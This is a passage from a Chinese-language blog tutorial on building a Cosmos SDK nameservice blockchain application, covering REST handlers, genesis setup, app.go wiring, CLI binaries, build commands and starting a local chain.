class="title">buyNameHandler</span><span class="params">(cliCtx context.CLIContext)</span></span> http.HandlerFunc &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">		<span class="keyword">var</span> req buyNameRequest</span><br><span class="line">		<span class="comment">// 读取请求</span></span><br><span class="line">		<span class="keyword">if</span> !rest.ReadRESTReq(w, r, cliCtx.Codec, &amp;req) &#123;</span><br><span class="line">			rest.WriteErrorResponse(w, http.StatusBadRequest, <span class="string">&quot;failed to parse request&quot;</span>)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		baseReq := req.BaseReq.Sanitize()</span><br><span class="line">		<span class="comment">// 基本的验证</span></span><br><span class="line">		<span class="keyword">if</span> !baseReq.ValidateBasic(w) &#123;</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// AccAddressFromBech32转换string为32位地址的方法</span></span><br><span class="line">		addr, err := sdk.AccAddressFromBech32(req.Buyer)</span><br><span class="line">		fmt.Println(addr)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			rest.WriteErrorResponse(w, http.StatusBadRequest, err.Error())</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 解析金额</span></span><br><span class="line">		<span class="comment">// ParseCoins 将字符串转为coin</span></span><br><span class="line">		coins, err := sdk.ParseCoins(req.Price)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			rest.WriteErrorResponse(w, http.StatusBadRequest, err.Error())</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 创建NewMsgBuyName对象</span></span><br><span class="line">		msg := types.NewMsgBuyName(req.Name, coins, addr)</span><br><span class="line">		<span class="comment">// 简单的验证</span></span><br><span class="line">		err = msg.ValidateBasic()</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			rest.WriteErrorResponse(w, http.StatusBadRequest, err.Error())</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 返回响应</span></span><br><span class="line">		utils.WriteGenerateStdTxResponse(w, cliCtx, baseReq, []sdk.Msg&#123;msg&#125;)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> setWhoisRequest <span class="keyword">struct</span> &#123;</span><br><span class="line">	BaseReq rest.BaseReq <span class="string">`json:&quot;base_req&quot;`</span></span><br><span class="line">	Name    <span class="type">string</span>       <span class="string">`json:&quot;name&quot;`</span></span><br><span class="line">	Value   <span class="type">string</span>       <span class="string">`json:&quot;value&quot;`</span></span><br><span class="line">	Creator <span class="type">string</span>       <span class="string">`json:&quot;creator&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置解析值</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">setWhoisHandler</span><span class="params">(cliCtx context.CLIContext)</span></span> http.HandlerFunc &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">		<span class="keyword">var</span> req setWhoisRequest</span><br><span class="line">		<span class="keyword">if</span> !rest.ReadRESTReq(w, r, cliCtx.Codec, &amp;req) &#123;</span><br><span class="line">			rest.WriteErrorResponse(w, http.StatusBadRequest, <span class="string">&quot;failed to parse request&quot;</span>)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		baseReq := req.BaseReq.Sanitize()</span><br><span class="line">		<span class="keyword">if</span> !baseReq.ValidateBasic(w) &#123;</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		addr, err := sdk.AccAddressFromBech32(req.Creator)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			rest.WriteErrorResponse(w, http.StatusBadRequest, err.Error())</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		msg := types.NewMsgSetName(req.Name, req.Value, addr)</span><br><span class="line"></span><br><span class="line">		err = msg.ValidateBasic()</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			rest.WriteErrorResponse(w, http.StatusBadRequest, err.Error())</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		utils.WriteGenerateStdTxResponse(w, cliCtx, baseReq, []sdk.Msg&#123;msg&#125;)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> deleteWhoisRequest <span class="keyword">struct</span> &#123;</span><br><span class="line">	BaseReq rest.BaseReq <span class="string">`json:&quot;base_req&quot;`</span></span><br><span class="line">	Owner   <span class="type">string</span>       <span class="string">`json:&quot;owner&quot;`</span></span><br><span class="line">	Name    <span class="type">string</span>       <span class="string">`json:&quot;name&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除消息</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">deleteWhoisHandler</span><span class="params">(cliCtx context.CLIContext)</span></span> http.HandlerFunc &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">		<span class="keyword">var</span> req deleteWhoisRequest</span><br><span class="line">		<span class="keyword">if</span> !rest.ReadRESTReq(w, r, cliCtx.Codec, &amp;req) &#123;</span><br><span class="line">			rest.WriteErrorResponse(w, http.StatusBadRequest, <span class="string">&quot;failed to parse request&quot;</span>)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		baseReq := req.BaseReq.Sanitize()</span><br><span class="line">		<span class="keyword">if</span> !baseReq.ValidateBasic(w) &#123;</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		addr, err := sdk.AccAddressFromBech32(req.Owner)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			rest.WriteErrorResponse(w, http.StatusBadRequest, err.Error())</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		msg := types.NewMsgDeleteName(req.Name, addr)</span><br><span class="line"></span><br><span class="line">		err = msg.ValidateBasic()</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			rest.WriteErrorResponse(w, http.StatusBadRequest, err.Error())</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		utils.WriteGenerateStdTxResponse(w, cliCtx, baseReq, []sdk.Msg&#123;msg&#125;)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意上述代码：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>BaseReq</code>包含用于进行交易的基本必填字段（使用哪个密钥，如何解码，使用哪条链等等）并且如所示被设计成嵌入形式。</p>
</li>
<li class="lvl-2">
<p><code>baseReq.ValidateBasic</code>和<code>utils.CompleteAndBroadcastTxREST</code>为你设置响应代码，因此你需担心在使用这些函数时处理错误或成功。</p>
</li>
</ul>
<blockquote>
<p>现在你的模块已经具备了全部功能，需要与 Cosmos SDK 应用合并。</p>
</blockquote>
<h1>AppModule Interface:</h1>
<p>Cosmos SDK为模块提供了一个标准接口。这个<code>AppModule</code>接口要求模块提供一组<code>ModuleBasicsManager</code>使用的方法，以便将它们合并到你的应用程序中。</p>
<blockquote>
<p>相关文件: <code>x/cosmosnameservice/module.go</code></p>
</blockquote>
<h1>Genesis:</h1>
<p><code>AppModule</code>接口包含了许多用于初始化和导出初始化状态的区块链函数。<br />
当启动、停止或导出链时，<code>ModuleBasicManager</code>在每个模块上调用这些函数。下面是一个非常基本的实现，您可以对其进行扩展。<br />
在 <code>x/cosmosnameservice/types/genesis.go</code>。我们会定义初始状态是什么，默认的初始状态以及验证它的方法这样我们就不会遇到任何错误当我们以预先存在的状态开始链的时候。</p>
<blockquote>
<p>相关文件: <code>x/cosmosnameservice/types/genesis.go</code></p>
</blockquote>
<p>关于上述代码的一些注意事项:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>ValidateGenesis()</code>: 验证提供的生成状态，以确保所期望的不变量保持不变</p>
</li>
<li class="lvl-2">
<p><code>DefaultGenesisState()</code>: 主要用于测试。这提供了一个最小的起源状态。</p>
</li>
<li class="lvl-2">
<p>在链启动时调用<code>InitGenesis()</code>，该函数将生成状态导入到keeper中。</p>
</li>
<li class="lvl-2">
<p><code>ExportGenesis()</code>在停止链后被调用，此函数将应用程序状态加载到<code>GenesisState</code>结构中，以便稍后导出到<code>genesis.json</code>以及来自其他模块的数据。</p>
</li>
</ul>
<h1>引入你的模块并完成程序:</h1>
<p>现在你的模块已就绪，它可以和其它两个模块auth和bank被合并到./app.go文件中:</p>
<blockquote>
<p>需要修改<code>app/app.go</code></p>
</blockquote>
<p>接下来，你需要在<code>NewApp</code>结构体中添加存储的<code>key</code>和<code>Keepers</code>：</p>
<h2 id="NewApp结构体">NewApp结构体:</h2>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 新的app结构体</span></span><br><span class="line"><span class="keyword">type</span> NewApp <span class="keyword">struct</span> &#123;</span><br><span class="line">	*bam.BaseApp</span><br><span class="line">	cdc *codec.Codec</span><br><span class="line"></span><br><span class="line">	invCheckPeriod <span class="type">uint</span></span><br><span class="line"></span><br><span class="line">	keys  <span class="keyword">map</span>[<span class="type">string</span>]*sdk.KVStoreKey</span><br><span class="line">	tKeys <span class="keyword">map</span>[<span class="type">string</span>]*sdk.TransientStoreKey</span><br><span class="line"></span><br><span class="line">	subspaces <span class="keyword">map</span>[<span class="type">string</span>]params.Subspace</span><br><span class="line"></span><br><span class="line">	accountKeeper     auth.AccountKeeper</span><br><span class="line">	bankKeeper        bank.Keeper</span><br><span class="line">	stakingKeeper     staking.Keeper</span><br><span class="line">	supplyKeeper      supply.Keeper</span><br><span class="line">	paramsKeeper      params.Keeper</span><br><span class="line">	nameserviceKeeper cosmosnameservicekeeper.Keeper</span><br><span class="line">	<span class="comment">// this line is used by starport scaffolding # 3</span></span><br><span class="line">	mm *module.Manager</span><br><span class="line"></span><br><span class="line">	sm *module.SimulationManager</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> _ simapp.App = (*NewApp)(<span class="literal">nil</span>)</span><br></pre></td></tr></table></figure>
<h2 id="构造函数">构造函数:</h2>
<p>并更新构造函数:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化app</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewInitApp</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	logger log.Logger, db dbm.DB, traceStore io.Writer, loadLatest <span class="type">bool</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">	invCheckPeriod <span class="type">uint</span>, baseAppOptions ...<span class="keyword">func</span>(*bam.BaseApp)</span></span>,</span><br><span class="line">) *NewApp &#123;</span><br><span class="line">	<span class="comment">// 首先定义将被不同模块共享的编解码器</span></span><br><span class="line">	cdc := MakeCodec()</span><br><span class="line">	<span class="comment">// BaseApp通过ABCI协议处理与Tendermint的交互</span></span><br><span class="line">	bApp := bam.NewBaseApp(appName, logger, db, auth.DefaultTxDecoder(cdc), baseAppOptions...)</span><br><span class="line">	bApp.SetCommitMultiStoreTracer(traceStore)</span><br><span class="line">	bApp.SetAppVersion(version.Version)</span><br><span class="line">	<span class="comment">// 所需要存储的键值</span></span><br><span class="line">	keys := sdk.NewKVStoreKeys(</span><br><span class="line">		bam.MainStoreKey,</span><br><span class="line">		auth.StoreKey,</span><br><span class="line">		staking.StoreKey,</span><br><span class="line">		supply.StoreKey,</span><br><span class="line">		params.StoreKey,</span><br><span class="line">		cosmosnameservicetypes.StoreKey,</span><br><span class="line">		<span class="comment">// this line is used by starport scaffolding # 5</span></span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">	tKeys := sdk.NewTransientStoreKeys(staking.TStoreKey, params.TStoreKey)</span><br><span class="line">	<span class="comment">// 初始化一个APP</span></span><br><span class="line">	<span class="keyword">var</span> app = &amp;NewApp&#123;</span><br><span class="line">		BaseApp:        bApp,</span><br><span class="line">		cdc:            cdc,</span><br><span class="line">		invCheckPeriod: invCheckPeriod,</span><br><span class="line">		keys:           keys,</span><br><span class="line">		tKeys:          tKeys,</span><br><span class="line">		subspaces:      <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]params.Subspace),</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// paramsKeeper 处理应用程序的参数存储</span></span><br><span class="line">	app.paramsKeeper = params.NewKeeper(app.cdc, keys[params.StoreKey], tKeys[params.TStoreKey])</span><br><span class="line">	app.subspaces[auth.ModuleName] = app.paramsKeeper.Subspace(auth.DefaultParamspace)</span><br><span class="line">	app.subspaces[bank.ModuleName] = app.paramsKeeper.Subspace(bank.DefaultParamspace)</span><br><span class="line">	app.subspaces[staking.ModuleName] = app.paramsKeeper.Subspace(staking.DefaultParamspace)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// AccountKeeper 处理address -&gt; account对应关系</span></span><br><span class="line">	app.accountKeeper = auth.NewAccountKeeper(</span><br><span class="line">		app.cdc,</span><br><span class="line">		keys[auth.StoreKey],</span><br><span class="line">		app.subspaces[auth.ModuleName],</span><br><span class="line">		auth.ProtoBaseAccount,</span><br><span class="line">	)</span><br><span class="line">	<span class="comment">// bankKeeper允许你与sdk.Coins交互</span></span><br><span class="line">	app.bankKeeper = bank.NewBaseKeeper(</span><br><span class="line">		app.accountKeeper,</span><br><span class="line">		app.subspaces[bank.ModuleName],</span><br><span class="line">		app.ModuleAccountAddrs(),</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">	app.supplyKeeper = supply.NewKeeper(</span><br><span class="line">		app.cdc,</span><br><span class="line">		keys[supply.StoreKey],</span><br><span class="line">		app.accountKeeper,</span><br><span class="line">		app.bankKeeper,</span><br><span class="line">		maccPerms,</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">	stakingKeeper := staking.NewKeeper(</span><br><span class="line">		app.cdc,</span><br><span class="line">		keys[staking.StoreKey],</span><br><span class="line">		app.supplyKeeper,</span><br><span class="line">		app.subspaces[staking.ModuleName],</span><br><span class="line">	)</span><br><span class="line">	<span class="comment">// 处理Atom</span></span><br><span class="line">	app.stakingKeeper = *stakingKeeper.SetHooks(</span><br><span class="line">		staking.NewMultiStakingHooks(),</span><br><span class="line">	)</span><br><span class="line">	<span class="comment">// 与我们自定义的域名服务模块交互</span></span><br><span class="line">	app.nameserviceKeeper = cosmosnameservicekeeper.NewKeeper(</span><br><span class="line">		app.bankKeeper,</span><br><span class="line">		app.cdc,</span><br><span class="line">		keys[cosmosnameservicetypes.StoreKey],</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// this line is used by starport scaffolding # 4</span></span><br><span class="line"></span><br><span class="line">	app.mm = module.NewManager(</span><br><span class="line">		genutil.NewAppModule(app.accountKeeper, app.stakingKeeper, app.BaseApp.DeliverTx),</span><br><span class="line">		auth.NewAppModule(app.accountKeeper),</span><br><span class="line">		bank.NewAppModule(app.bankKeeper, app.accountKeeper),</span><br><span class="line">		supply.NewAppModule(app.supplyKeeper, app.accountKeeper),</span><br><span class="line">		cosmosnameservice.NewAppModule(app.nameserviceKeeper, app.bankKeeper),</span><br><span class="line">		staking.NewAppModule(app.stakingKeeper, app.accountKeeper, app.supplyKeeper),</span><br><span class="line">		<span class="comment">// this line is used by starport scaffolding # 6</span></span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">	app.mm.SetOrderEndBlockers(staking.ModuleName)</span><br><span class="line"></span><br><span class="line">	app.mm.SetOrderInitGenesis(</span><br><span class="line">		staking.ModuleName,</span><br><span class="line">		auth.ModuleName,</span><br><span class="line">		bank.ModuleName,</span><br><span class="line">		cosmosnameservicetypes.ModuleName,</span><br><span class="line">		supply.ModuleName,</span><br><span class="line">		genutil.ModuleName,</span><br><span class="line">		<span class="comment">// this line is used by starport scaffolding # 7</span></span><br><span class="line">	)</span><br><span class="line">	<span class="comment">// 注册路由的句柄</span></span><br><span class="line">	<span class="comment">// 注册域名服务路由和查询路由</span></span><br><span class="line">	app.mm.RegisterRoutes(app.Router(), app.QueryRouter())</span><br><span class="line">	<span class="comment">// 初始化相关参数</span></span><br><span class="line">	app.SetInitChainer(app.InitChainer)</span><br><span class="line">	app.SetBeginBlocker(app.BeginBlocker)</span><br><span class="line">	app.SetEndBlocker(app.EndBlocker)</span><br><span class="line">	<span class="comment">// AnteHandler 处理签名验证和交易预处理</span></span><br><span class="line">	app.SetAnteHandler(</span><br><span class="line">		auth.NewAnteHandler(</span><br><span class="line">			app.accountKeeper,</span><br><span class="line">			app.supplyKeeper,</span><br><span class="line">			auth.DefaultSigVerificationGasConsumer,</span><br><span class="line">		),</span><br><span class="line">	)</span><br><span class="line">	<span class="comment">// 从KV数据库加载相关数据</span></span><br><span class="line">	app.MountKVStores(keys)</span><br><span class="line">	app.MountTransientStores(tKeys)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> loadLatest &#123;</span><br><span class="line">		err := app.LoadLatestVersion(app.keys[bam.MainStoreKey])</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			tmos.Exit(err.Error())</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> app</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>构造函数包含以下步骤：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>从每个所需模块中实例化所需的<code>Keeper</code></p>
</li>
<li class="lvl-2">
<p>生成每个<code>Keeper</code>所需的<code>storeKey</code></p>
</li>
<li class="lvl-2">
<p>注册每个模块的<code>handler</code></p>
</li>
<li class="lvl-2">
<p>注册每个模块的<code>querier</code></p>
</li>
<li class="lvl-2">
<p>将<code>KVStores</code>挂载到baseApp的<code>multistore</code>提供的key值</p>
</li>
<li class="lvl-2">
<p>设置<code>initChainer</code>来定义初始应用程序状态</p>
</li>
</ul>
<p>注意模块的启动方式：顺序很重要！在这里，<strong>序列是Auth-&gt; Bank-&gt; Feecollection-&gt; Stake-&gt; Distribution-&gt; Slashing，</strong>，然后为stake模块设置了钩子。这是因为其中一些模块在使用之前就依赖于其他现有模块。</p>
<h2 id="辅助函数">辅助函数:</h2>
<p>添加一个辅助函数来生成一个animo–<code>*codec.Codec</code>，它可以正确地注册你应用程序中使用的所有模块：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 生成一个animo： *codec.Codec</span></span><br><span class="line"><span class="comment">// 正确地注册你应用程序中使用的所有模块</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MakeCodec</span><span class="params">()</span></span> *codec.Codec &#123;</span><br><span class="line">	<span class="keyword">var</span> cdc = codec.New()</span><br><span class="line"></span><br><span class="line">	ModuleBasics.RegisterCodec(cdc)</span><br><span class="line">	sdk.RegisterCodec(cdc)</span><br><span class="line">	codec.RegisterCrypto(cdc)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> cdc.Seal()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>现在您已经创建了一个包含模块的应用程序，现在是时候构建入口点了！</p>
</blockquote>
<h1>程序入口点Entrypoint:</h1>
<p>golang的规范是把编译成可执行程序的文件放在项目的<code>./cmd</code>文件夹中。对于你的应用程序，您要创建2个可执行程序：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>cosmos-nameserviced</code> : 此可执行程序类似于<code>bitcoind</code>或其他加密货币的daemon，因为它维护<strong>p2p连接，广播交易，处理本地存储并提供用以与网络交互的RPC接口</strong>。在这种情况下，Tendermint被用于网络层和排序交易。</p>
</li>
<li class="lvl-2">
<p><code>cosmos-nameservicecli</code> : 此可执行程序提供用户与你的应用程序交互的命令。</p>
</li>
</ul>
<p>相关文件:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>cmd/cosmos-nameserviced/main.go</code></p>
</li>
<li class="lvl-2">
<p><code>cmd/cosmos-nameservicecli/main.go</code></p>
</li>
</ul>
<h2 id="cosmos-nameserviced">cosmos-nameserviced:</h2>
<blockquote>
<p>相关文件:<code>cmd/cosmos-nameserviced/main.go</code></p>
</blockquote>
<p>注意上述代码中：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>上面的大部分代码都结合了来自以下包的CLI命令：</p>
<ol>
<li class="lvl-7">Tendermint</li>
<li class="lvl-7">Cosmos-SDK</li>
<li class="lvl-7">你的nameservice模块</li>
</ol>
</li>
<li class="lvl-2">
<p><code>InitCmd</code>允许应用程序从配置中生成创世纪状态。深入了解函数调用，以了解有关区块链初始化过程的更多信息。</p>
</li>
<li class="lvl-2">
<p><code>AddGenesisAccountCmd</code>可以方便地将帐户添加到创世文件中，允许在区块链启动时就使用资产钱包。</p>
</li>
</ul>
<h2 id="cosmos-nameservicecli">cosmos-nameservicecli:</h2>
<blockquote>
<p>相关文件:<code>cmd/cosmos-nameservicecli/main.go</code></p>
</blockquote>
<p>注意：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>代码结合了来自以下包的CLI命令：Tendermint、Cosmos-SDK、你的nameservice模块</p>
</li>
<li class="lvl-2">
<p>cobra CLI文档将有助于理解上述代码</p>
</li>
<li class="lvl-2">
<p>你可以在这里看到之前定义的<code>ModuleClient</code></p>
</li>
<li class="lvl-2">
<p>注意如何将路由包含在<code>registerRoutes</code>函数中</p>
</li>
</ul>
<blockquote>
<p>现在你已经定义了二进制文件，那么就可以来处理依赖关系管理并构建应用程序。</p>
</blockquote>
<h1>构建你的程序:</h1>
<h2 id="Makefile">Makefile:</h2>
<p>通过在根目录中编写包含常用命令的<code>./Makefile</code>来帮助用户编译应用程序：</p>
<blockquote>
<p>相关文件:<code>./Makefile</code></p>
</blockquote>
<h2 id="go-mod">go.mod:</h2>
<p>Golang有一些依赖管理工具。在本教程中，你将使用Go Modules。Go Modules使用仓库根目录中的<code>go.mod</code>文件来定义应用程序所需的依赖项。Cosmos SDK 应用程序目前依赖于某些库的特定版本。</p>
<h2 id="编译应用程序">编译应用程序:</h2>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加环境变量</span></span><br><span class="line">vim /etc/profile</span><br><span class="line"><span class="built_in">export</span> PATH=$(go <span class="built_in">env</span> GOPATH)/bin:<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Install the app into your $GOBIN</span></span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line"><span class="comment"># Now you should be able to run the following commands:</span></span><br><span class="line"><span class="comment"># 可执行文件会生成在GOPATH的bin目录下</span></span><br><span class="line">cosmos-nameserviced <span class="built_in">help</span></span><br><span class="line">cosmos-nameservicecli <span class="built_in">help</span></span><br></pre></td></tr></table></figure>
<h2 id="cosmos-nameserviced-2">cosmos-nameserviced</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost cosmos-nameservice]<span class="comment"># cosmos-nameserviced help</span></span><br><span class="line">app Daemon (server)</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  cosmos-nameserviced [<span class="built_in">command</span>]</span><br><span class="line"></span><br><span class="line">Available Commands:</span><br><span class="line">  init                Initialize private validator, p2p, genesis, and application configuration files</span><br><span class="line">  collect-gentxs      Collect genesis txs and output a genesis.json file</span><br><span class="line">  migrate             Migrate genesis to a specified target version</span><br><span class="line">  gentx               Generate a genesis tx carrying a self delegation</span><br><span class="line">  validate-genesis    validates the genesis file at the default location or at the location passed as an arg</span><br><span class="line">  add-genesis-account Add a genesis account to genesis.json</span><br><span class="line">  debug               Tool <span class="keyword">for</span> helping with debugging your application</span><br><span class="line">  start               Run the full node</span><br><span class="line">  unsafe-reset-all    Resets the blockchain database, removes address book files, and resets priv_validator.json to the genesis state</span><br><span class="line"></span><br><span class="line">  tendermint          Tendermint subcommands</span><br><span class="line">  <span class="built_in">export</span>              Export state to JSON</span><br><span class="line"></span><br><span class="line">  version             Print the app version</span><br><span class="line">  <span class="built_in">help</span>                Help about any <span class="built_in">command</span></span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -h, --<span class="built_in">help</span>                    <span class="built_in">help</span> <span class="keyword">for</span> cosmos-nameserviced</span><br><span class="line">      --home string             directory <span class="keyword">for</span> config and data (default <span class="string">&quot;/root/.nameserviced&quot;</span>)</span><br><span class="line">      --inv-check-period uint   Assert registered invariants every N blocks</span><br><span class="line">      --log_level string        Log level (default <span class="string">&quot;main:info,state:info,*:error&quot;</span>)</span><br><span class="line">      --trace                   <span class="built_in">print</span> out full stack trace on errors</span><br><span class="line"></span><br><span class="line">Use <span class="string">&quot;cosmos-nameserviced [command] --help&quot;</span> <span class="keyword">for</span> more information about a <span class="built_in">command</span>.</span><br></pre></td></tr></table></figure>
<h2 id="cosmos-nameservicecli-2">cosmos-nameservicecli:</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost cosmos-nameservice]<span class="comment"># cosmos-nameservicecli help</span></span><br><span class="line">Command line interface <span class="keyword">for</span> interacting with cosmosnameserviced</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  cosmos-nameservicecli [<span class="built_in">command</span>]</span><br><span class="line"></span><br><span class="line">Available Commands:</span><br><span class="line">  status      Query remote node <span class="keyword">for</span> status</span><br><span class="line">  config      Create or query an application CLI configuration file</span><br><span class="line">  query       Querying subcommands</span><br><span class="line">  tx          Transactions subcommands</span><br><span class="line"></span><br><span class="line">  rest-server Start LCD (light-client daemon), a <span class="built_in">local</span> REST server</span><br><span class="line"></span><br><span class="line">  keys        Add or view <span class="built_in">local</span> private keys</span><br><span class="line"></span><br><span class="line">  version     Print the app version</span><br><span class="line">  <span class="built_in">help</span>        Help about any <span class="built_in">command</span></span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">      --chain-id string   Chain ID of tendermint node</span><br><span class="line">  -e, --encoding string   Binary encoding (hex|b64|btc) (default <span class="string">&quot;hex&quot;</span>)</span><br><span class="line">  -h, --<span class="built_in">help</span>              <span class="built_in">help</span> <span class="keyword">for</span> cosmos-nameservicecli</span><br><span class="line">      --home string       directory <span class="keyword">for</span> config and data (default <span class="string">&quot;/root/.nameservicecli&quot;</span>)</span><br><span class="line">  -o, --output string     Output format (text|json) (default <span class="string">&quot;text&quot;</span>)</span><br><span class="line">      --trace             <span class="built_in">print</span> out full stack trace on errors</span><br><span class="line"></span><br><span class="line">Use <span class="string">&quot;cosmos-nameservicecli [command] --help&quot;</span> <span class="keyword">for</span> more information about a <span class="built_in">command</span>.</span><br></pre></td></tr></table></figure>
<blockquote>
<p>恭喜，您已完成名称服务应用！尝试运行并使用吧！</p>
</blockquote>
<h1>运行程序:</h1>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 初始化配置文件和创世文件</span></span><br><span class="line">cosmos-nameserviced init moniker --chain-id namechain</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建两个账号,分别为 jack 和 alice</span></span><br><span class="line">cosmos-nameservicecli keys add jack</span><br><span class="line">cosmos-nameservicecli keys add alice</span><br><span class="line"></span><br><span class="line"><span class="comment"># 往 genesis.json 中添加创世账号，账号需要包括地址和初始的币</span></span><br><span class="line">cosmos-nameserviced add-genesis-account $(cosmos-nameservicecli keys show jack -a) 1000nametoken,1000000000stake</span><br><span class="line">cosmos-nameserviced add-genesis-account $(cosmos-nameservicecli keys show alice -a) 1000nametoken,1000000000stake</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查资金余额</span></span><br><span class="line">cosmos-nameservicecli query account $(cosmos-nameservicecli keys show jack -a)</span><br><span class="line">cosmos-nameservicecli query account $(cosmos-nameservicecli keys show alice -a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一笔创世交易, 交易生成在 /config/gentx/filename.json</span></span><br><span class="line">cosmos-nameserviced gentx --name jack</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将上一步生成的创世交易写入 genesis.json</span></span><br><span class="line">cosmos-nameserviced collect-gentxs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 校验 genesis 信息</span></span><br><span class="line">cosmos-nameserviced validate-genesis</span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure your CLI to eliminate need for chain-id flag</span></span><br><span class="line">cosmos-nameservicecli config chain-id namechain</span><br><span class="line">cosmos-nameservicecli config output json</span><br><span class="line">cosmos-nameservicecli config indent <span class="literal">true</span></span><br><span class="line">cosmos-nameservicecli config trust-node <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动 namachain</span></span><br><span class="line">cosmos-nameserviced start</span><br></pre></td></tr></table></figure>
<p>将看到日志开始不停输出，表示正在生成的区块:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220908145241.png" alt="20220908145241" /></p>
<h1>使用cli测试域名解析应用:</h1>
